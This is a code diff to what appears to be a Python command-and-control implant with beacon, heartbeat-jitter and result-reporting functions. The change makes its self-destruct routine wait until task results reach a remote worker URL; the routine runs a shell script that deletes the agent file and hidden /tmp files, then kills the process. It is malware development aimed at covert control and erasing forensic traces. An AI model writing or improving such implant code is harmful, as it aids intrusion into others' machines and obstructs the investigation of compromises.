@@ -399,6 +399,9 @@ def _module_heartbeat(args: list) -> str:
     return f"[heartbeat: {BEACON_INT}s ±{JITTER}s]"
 
 
+_suicide_sent = threading.Event()
+
+
 def _module_suicide() -> str:
     agent_file = os.path.abspath(__file__)
     pid        = os.getpid()
@@ -416,8 +419,9 @@ def _module_suicide() -> str:
         "find /tmp -maxdepth 1 -name '.*' -user \"$(id -nu)\" -delete 2>/dev/null\n"
         f"kill {pid} 2>/dev/null\n"
     )
+    _suicide_sent.clear()
     def _run():
-        time.sleep(2)
+        _suicide_sent.wait(timeout=30)
         subprocess.run(cleanup, shell=True, capture_output=True)
     threading.Thread(target=_run, daemon=True).start()
     return "[suicide: ok]"
@@ -506,6 +510,7 @@ def _beacon():
     result_url = f"{WORKER_URL}/result/{task['task_id']}"
     for _ in range(5):
         if _put(result_url, result) == 200:
+            _suicide_sent.set()
             break
         time.sleep(1)
 
